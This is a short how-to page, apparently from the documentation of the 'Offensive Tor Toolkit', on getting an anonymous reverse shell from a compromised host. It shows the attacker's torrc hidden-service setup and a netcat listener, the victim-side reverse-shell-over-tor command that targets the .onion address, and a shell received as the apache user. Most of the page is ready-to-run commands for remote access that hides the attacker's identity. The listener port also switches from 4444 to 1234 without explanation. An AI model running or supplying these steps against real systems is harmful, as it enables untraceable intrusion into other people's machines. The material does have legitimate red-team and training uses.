# Gaining access with reverse-shell-over-tor

{% hint style="warning" %}
We assume that **we are able to execute commands in Victim1** in some way.
{% endhint %}

In order to obtain a reverse shell preserving anonymity, we will use **reverse-shell-over-tor** from **Offensive Tor Toolkit**. As shown in the following illustration, the attacker will publish a Hidden Service so that the victim can send the reverse shell to it.

![Reverse shell over Tor](https://atorrescogollo.github.io/geekdoc/posts/static/offensive-tor-toolkit/02_reverse-shell-over-tor.png)

## 1. Hidden Service and handler

The attacker will publish a **Hidden Service** so that the attacker can start a connection:

```text
[attacker]$ grep '^HiddenService' /etc/tor/torrc
HiddenServiceDir /tmp/tortest
HiddenServicePort 4444 127.0.0.1:4444

[attacker]$ cat /tmp/tortest/hostname
m5et..jyd.onion

[attacker]$ tor -f /etc/tor/torrc
```

In order to handle the connection, the attacker will start a **listener** with netcat:

```text
[attacker]$ nc -lvnp 4444
```

## 2. Victim connects to the Hidden Service

We have to launch a reverse shell from the Victim to the Hidden Service. The tool we need is **`reverse-shell-over-tor`** . The only parameter we need is the address and port in which the Hidden Service is listening.

```text
[victim1]$ ./reverse-shell-over-tor -listener m5et..jyd.onion:4444
```

## 3. The handler receives the shell

Once the victim connects with `reverse-shell-over-tor` , a `/bin/sh` shell is launched.

```text
[attacker]$ nc -lvnp 1234
...
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

{% hint style="info" %}
The attacker could change the shell binary by using the **parameter `-reverse-shell-program`**.
{% endhint %}

